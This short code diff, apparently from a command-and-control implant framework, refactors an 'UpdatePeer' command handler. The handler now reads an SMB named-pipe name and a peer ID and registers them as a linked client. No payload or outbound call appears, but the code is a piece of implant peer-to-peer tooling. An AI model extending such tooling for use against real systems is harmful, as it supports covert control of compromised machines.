@@ -223,17 +223,13 @@ namespace Commands {
         ntstatus = ERROR_EXIT;
     }
 
-    VOID UpdatePeer(_parser *parser) {
-        HEXANE;
+    VOID UpdatePeer(_parser *const parser) {
+        HEXANE
 
-	// todo : refactor everything here
-        auto name_length = x_wcslen(Ctx->transport.smb->ingress_name) * sizeof(WCHAR);
+        auto pipe_name  = Parser::UnpackWString(parser, nullptr);
+        auto peer_id    = Parser::UnpackDword(parser);
 
-        if (Ctx->transport.smb->ingress_name) {
-            x_memset(Ctx->transport.smb->ingress_name, 0, name_length);
-            x_free(Ctx->transport.smb->ingress_name);
-        }
+        Clients::AddClient(pipe_name, peer_id);
 
-        Parser::ParserWcscpy(parser, &Ctx->transport.smb->ingress_name, nullptr);
     }
 }
